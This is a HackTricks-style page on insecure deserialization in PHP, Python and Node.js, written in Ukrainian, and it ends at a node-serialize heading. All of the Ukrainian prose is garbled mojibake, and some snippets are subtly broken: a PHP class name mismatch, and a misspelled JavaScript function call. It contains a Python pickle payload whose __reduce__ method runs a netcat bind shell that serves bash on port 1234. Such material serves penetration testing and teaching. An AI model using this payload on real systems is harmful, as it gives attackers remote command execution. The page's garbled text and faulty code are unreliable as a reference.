# Deserialization

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**–°–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è** —Ä–æ–∑—É–º—ñ—î—Ç—å—Å—è —è–∫ –º–µ—Ç–æ–¥ –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞ –≤ —Ñ–æ—Ä–º–∞—Ç, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ –∑–±–µ—Ä–µ–∂–µ–Ω–∏–π, –∑ –Ω–∞–º—ñ—Ä–æ–º –∞–±–æ –∑–±–µ—Ä–µ–≥—Ç–∏ –æ–±'—î–∫—Ç, –∞–±–æ –ø–µ—Ä–µ–¥–∞—Ç–∏ –π–æ–≥–æ —è–∫ —á–∞—Å—Ç–∏–Ω—É –ø—Ä–æ—Ü–µ—Å—É –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó. –¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –≤—ñ–¥—Ç–≤–æ—Ä–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞ –≤ –º–∞–π–±—É—Ç–Ω—å–æ–º—É, –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ –π–æ–≥–æ —Å—Ç—Ä—É–∫—Ç—É—Ä—É —Ç–∞ —Å—Ç–∞–Ω.

**–î–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è**, –Ω–∞–≤–ø–∞–∫–∏, —î –ø—Ä–æ—Ü–µ—Å–æ–º, —è–∫–∏–π –ø—Ä–æ—Ç–∏–¥—ñ—î —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó. –í—ñ–Ω –≤–∫–ª—é—á–∞—î –≤ —Å–µ–±–µ –≤–∑—è—Ç—Ç—è –¥–∞–Ω–∏—Ö, —è–∫—ñ –±—É–ª–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä–æ–≤–∞–Ω—ñ –≤ –ø–µ–≤–Ω–æ–º—É —Ñ–æ—Ä–º–∞—Ç—ñ, —ñ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è —ó—Ö –Ω–∞–∑–∞–¥ –≤ –æ–±'—î–∫—Ç.

–î–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è –º–æ–∂–µ –±—É—Ç–∏ –Ω–µ–±–µ–∑–ø–µ—á–Ω–æ—é, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ **–¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –∫–æ–¥—É** –∞–±–æ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –Ω–µ–ø–µ—Ä–µ–¥–±–∞—á—É–≤–∞–Ω—É –ø–æ–≤–µ–¥—ñ–Ω–∫—É –≤ –¥–æ–¥–∞—Ç–∫—É –ø—ñ–¥ —á–∞—Å –ø—Ä–æ—Ü–µ—Å—É –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞.

## PHP

–í PHP –ø—ñ–¥ —á–∞—Å –ø—Ä–æ—Ü–µ—Å—ñ–≤ —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó —Ç–∞ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –º–∞–≥—ñ—á–Ω—ñ –º–µ—Ç–æ–¥–∏:

* `__sleep`: –í–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è, –∫–æ–ª–∏ –æ–±'—î–∫—Ç —Å–µ—Ä—ñ–∞–ª—ñ–∑—É—î—Ç—å—Å—è. –¶–µ–π –º–µ—Ç–æ–¥ –ø–æ–≤–∏–Ω–µ–Ω –ø–æ–≤–µ—Ä—Ç–∞—Ç–∏ –º–∞—Å–∏–≤ —ñ–º–µ–Ω —É—Å—ñ—Ö –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π –æ–±'—î–∫—Ç–∞, —è–∫—ñ –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ. –í—ñ–Ω –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —Ñ—ñ–∫—Å–∞—Ü—ñ—ó –æ—á—ñ–∫—É—é—á–∏—Ö –¥–∞–Ω–∏—Ö –∞–±–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø–æ–¥—ñ–±–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å –æ—á–∏—â–µ–Ω–Ω—è.
* `__wakeup`: –í–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è, –∫–æ–ª–∏ –æ–±'—î–∫—Ç –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑—É—î—Ç—å—Å—è. –í—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –±—É–¥—å-—è–∫–∏—Ö –∑'—î–¥–Ω–∞–Ω—å –∑ –±–∞–∑–æ—é –¥–∞–Ω–∏—Ö, —è–∫—ñ –º–æ–≥–ª–∏ –±—É—Ç–∏ –≤—Ç—Ä–∞—á–µ–Ω—ñ –ø—ñ–¥ —á–∞—Å —Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —ñ–Ω—à–∏—Ö –∑–∞–≤–¥–∞–Ω—å –ø–æ–≤—Ç–æ—Ä–Ω–æ—ó —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó.
* `__unserialize`: –¶–µ–π –º–µ—Ç–æ–¥ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –∑–∞–º—ñ—Å—Ç—å `__wakeup` (—è–∫—â–æ –≤—ñ–Ω —ñ—Å–Ω—É—î) –ø—ñ–¥ —á–∞—Å –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –æ–±'—î–∫—Ç–∞. –í—ñ–Ω –Ω–∞–¥–∞—î –±—ñ–ª—å—à–µ –∫–æ–Ω—Ç—Ä–æ–ª—é –Ω–∞–¥ –ø—Ä–æ—Ü–µ—Å–æ–º –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –≤ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—ñ –∑ `__wakeup`.
* `__destruct`: –¶–µ–π –º–µ—Ç–æ–¥ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è, –∫–æ–ª–∏ –æ–±'—î–∫—Ç –∑–±–∏—Ä–∞—î—Ç—å—Å—è –±—É—Ç–∏ –∑–Ω–∏—â–µ–Ω–∏–º –∞–±–æ –∫–æ–ª–∏ —Å–∫—Ä–∏–ø—Ç –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è. –í—ñ–Ω –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∑–∞–≤–¥–∞–Ω—å –æ—á–∏—â–µ–Ω–Ω—è, —Ç–∞–∫–∏—Ö —è–∫ –∑–∞–∫—Ä–∏—Ç—Ç—è —Ñ–∞–π–ª–æ–≤–∏—Ö –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä—ñ–≤ –∞–±–æ –∑'—î–¥–Ω–∞–Ω—å –∑ –±–∞–∑–æ—é –¥–∞–Ω–∏—Ö.
* `__toString`: –¶–µ–π –º–µ—Ç–æ–¥ –¥–æ–∑–≤–æ–ª—è—î –æ–±'—î–∫—Ç—É —Ä–æ–∑–≥–ª—è–¥–∞—Ç–∏—Å—è —è–∫ —Ä—è–¥–æ–∫. –í—ñ–Ω –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è —Ñ–∞–π–ª—É –∞–±–æ —ñ–Ω—à–∏—Ö –∑–∞–≤–¥–∞–Ω—å –Ω–∞ –æ—Å–Ω–æ–≤—ñ –≤–∏–∫–ª–∏–∫—ñ–≤ —Ñ—É–Ω–∫—Ü—ñ–π –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω—å–æ–≥–æ, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –Ω–∞–¥–∞—é—á–∏ —Ç–µ–∫—Å—Ç–æ–≤–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
–Ø–∫—â–æ –≤–∏ –ø–æ–¥–∏–≤–∏—Ç–µ—Å—è –Ω–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ —Ñ—É–Ω–∫—Ü—ñ—ó **`__wakeup`** —Ç–∞ **`__destruct`** –≤–∏–∫–ª–∏–∫–∞—é—Ç—å—Å—è, –∫–æ–ª–∏ –æ–±'—î–∫—Ç –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑—É—î—Ç—å—Å—è. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤ –∫—ñ–ª—å–∫–æ—Ö –ø—ñ–¥—Ä—É—á–Ω–∏–∫–∞—Ö –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ, —â–æ —Ñ—É–Ω–∫—Ü—ñ—è **`__toString`** –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è, –∫–æ–ª–∏ –Ω–∞–º–∞–≥–∞—é—Ç—å—Å—è –Ω–∞–¥—Ä—É–∫—É–≤–∞—Ç–∏ –¥–µ—è–∫–∏–π –∞—Ç—Ä–∏–±—É—Ç, –∞–ª–µ, –æ—á–µ–≤–∏–¥–Ω–æ, —Ü–µ **–±—ñ–ª—å—à–µ –Ω–µ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è**.

{% hint style="warning" %}
–ú–µ—Ç–æ–¥ **`__unserialize(array $data)`** –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è **–∑–∞–º—ñ—Å—Ç—å `__wakeup()`**, —è–∫—â–æ –≤—ñ–Ω —Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π —É –∫–ª–∞—Å—ñ. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –æ–±'—î–∫—Ç, –Ω–∞–¥–∞—é—á–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω—ñ –¥–∞–Ω—ñ —É –≤–∏–≥–ª—è–¥—ñ –º–∞—Å–∏–≤—É. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π –º–µ—Ç–æ–¥ –¥–ª—è –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π —ñ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –±—É–¥—å-—è–∫–∏—Ö –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å –ø—ñ–¥ —á–∞—Å –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏ –ø–æ—è—Å–Ω–µ–Ω–∏–π **PHP –ø—Ä–∏–∫–ª–∞–¥ —Ç—É—Ç**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), —Ç—É—Ç [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) –∞–±–æ —Ç—É—Ç [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

–í–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—é –∞–≤—Ç–æ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è PHP –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö php —Ñ–∞–π–ª—ñ–≤ —Ç–∞ –±—ñ–ª—å—à–µ:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### –°–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è –ø–æ—Å–∏–ª–∞–ª—å–Ω–∏—Ö –∑–Ω–∞—á–µ–Ω—å

–Ø–∫—â–æ –∑ —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏ –≤–∏ —Ö–æ—á–µ—Ç–µ —Å–µ—Ä—ñ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è —è–∫ **–ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ —ñ–Ω—à–µ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è**, –≤–∏ –º–æ–∂–µ—Ç–µ:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial –¥–ª—è PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) –º–æ–∂–µ –¥–æ–ø–æ–º–æ–≥—Ç–∏ –≤–∞–º –≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ payload'–∏ –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è–º–∏ PHP.\
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤ –∫—ñ–ª—å–∫–æ—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –≤–∏ **–Ω–µ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Å–ø–æ—Å—ñ–± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—î—é –≤ –≤–∏—Ö—ñ–¥–Ω–æ–º—É –∫–æ–¥—ñ** –ø—Ä–æ–≥—Ä–∞–º–∏, –∞–ª–µ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –∫–æ–¥–æ–º –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö PHP —Ä–æ–∑—à–∏—Ä–µ–Ω—å.**\
–û—Ç–∂–µ, —è–∫—â–æ –º–æ–∂–µ—Ç–µ, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ `phpinfo()` —Å–µ—Ä–≤–µ—Ä–∞ —Ç–∞ **–ø–æ—à—É–∫–∞–π—Ç–µ –≤ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ** (–Ω–∞–≤—ñ—Ç—å –Ω–∞ **gadgets** **PHPGGC**) –º–æ–∂–ª–∏–≤—ñ gadgets, —è–∫–∏–º–∏ –≤–∏ –º–æ–≥–ª–∏ –± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏.

### phar:// –º–µ—Ç–∞–¥–∞–Ω—ñ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π—à–ª–∏ LFI, —è–∫–∏–π –ø—Ä–æ—Å—Ç–æ —á–∏—Ç–∞—î —Ñ–∞–π–ª —ñ –Ω–µ –≤–∏–∫–æ–Ω—É—î php –∫–æ–¥ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω—å–æ–≥–æ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ _**file\_get\_contents(), fopen(), file() –∞–±–æ file\_exists(), md5\_file(), filemtime() –∞–±–æ filesize()**_**.** –í–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ **–¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—î—é**, —â–æ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –ø—Ä–∏ **—á–∏—Ç–∞–Ω–Ω—ñ** **—Ñ–∞–π–ª—É** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–æ—Ç–æ–∫–æ–ª—É **phar**.\
–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ—á–∏—Ç–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –ø–æ—Å—Ç:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

–ö–æ–ª–∏ –æ–±'—î–∫—Ç –±—É–¥–µ —Ä–æ–∑–ø–∞–∫–æ–≤–∞–Ω–∏–π, —Ñ—É–Ω–∫—Ü—ñ—è _\_\_reduce\_\__ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∞.\
–ü—Ä–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Å–µ—Ä–≤–µ—Ä –º–æ–∂–µ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ –ø–æ–º–∏–ª–∫—É.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
–ü–µ—Ä–µ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∫–æ—é —Ç–µ—Ö–Ω—ñ–∫–∏ –æ–±—Ö–æ–¥—É —Å–ø—Ä–æ–±—É–π—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ `print(base64.b64encode(pickle.dumps(P(),2)))`, —â–æ–± –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –æ–±'—î–∫—Ç, —è–∫–∏–π —Å—É–º—ñ—Å–Ω–∏–π –∑ python2, —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ python3.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –≤—Ç–µ—á—É –∑ **pickle jails** –¥–∏–≤—ñ—Ç—å—Å—è:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

–ù–∞—Å—Ç—É–ø–Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—î —Ç–µ—Ö–Ω—ñ–∫—É **–∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏–º –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—î—é –≤ yamls** –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞—Ö python —ñ –∑–∞–≤–µ—Ä—à—É—î—Ç—å—Å—è —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–º, —è–∫–∏–π –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó RCE –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ–π–Ω–æ–≥–æ payload –¥–ª—è **Pickle, PyYAML, jsonpickle —Ç–∞ ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Class Pollution (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JS **–Ω–µ –º–∞—î "–º–∞–≥—ñ—á–Ω–∏—Ö" —Ñ—É–Ω–∫—Ü—ñ–π** —è–∫ PHP –∞–±–æ Python, —è–∫—ñ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è –ª–∏—à–µ –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞. –ê–ª–µ –º–∞—î –¥–µ—è–∫—ñ **—Ñ—É–Ω–∫—Ü—ñ—ó**, —è–∫—ñ **—á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –Ω–∞–≤—ñ—Ç—å –±–µ–∑ –ø—Ä—è–º–æ–≥–æ –≤–∏–∫–ª–∏–∫—É**, —Ç–∞–∫—ñ —è–∫ **`toString`**, **`valueOf`**, **`toJSON`**.\
–Ø–∫—â–æ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—î—é, –≤–∏ –º–æ–∂–µ—Ç–µ **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ —Ü—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —ñ–Ω—à–æ–≥–æ –∫–æ–¥—É** (–ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è–º –ø—Ä–æ—Ç–æ—Ç–∏–ø—É), –≤–∏ –º–æ–≥–ª–∏ –± –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥, –∫–æ–ª–∏ —ó—Ö –≤–∏–∫–ª–∏–∫–∞—é—Ç—å.

–©–µ –æ–¥–∏–Ω **"–º–∞–≥—ñ—á–Ω–∏–π" —Å–ø–æ—Å—ñ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é** –±–µ–∑ –ø—Ä—è–º–æ–≥–æ –≤–∏–∫–ª–∏–∫—É - —Ü–µ **–∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—è –æ–±'—î–∫—Ç–∞, —è–∫–∏–π –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ—é —Ñ—É–Ω–∫—Ü—ñ—î—é** (promise). –¢–æ–º—É, —è–∫—â–æ –≤–∏ **–ø–µ—Ä–µ—Ç–≤–æ—Ä–∏—Ç–µ** —Ü–µ–π **–æ–±'—î–∫—Ç –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è** –≤ —ñ–Ω—à–∏–π **promise** –∑ **–≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—é** –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **"then" —Ç–∏–ø—É —Ñ—É–Ω–∫—Ü—ñ—è**, –≤—ñ–Ω –±—É–¥–µ **–≤–∏–∫–æ–Ω–∞–Ω–∏–π** –ª–∏—à–µ —Ç–æ–º—É, —â–æ –π–æ–≥–æ –ø–æ–≤–µ—Ä—Ç–∞—î —ñ–Ω—à–∏–π promise. _–°–ª—ñ–¥–∫—É–π—Ç–µ_ [_**–∑–∞ —Ü–∏–º –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _–¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` —Ç–∞ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è `prototype`

–Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –ø—Ä–æ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É **–æ–∑–Ω–∞–π–æ–º—Ç–µ—Å—è –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏–º –ø–æ—Å—ñ–±–Ω–∏–∫–æ–º**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

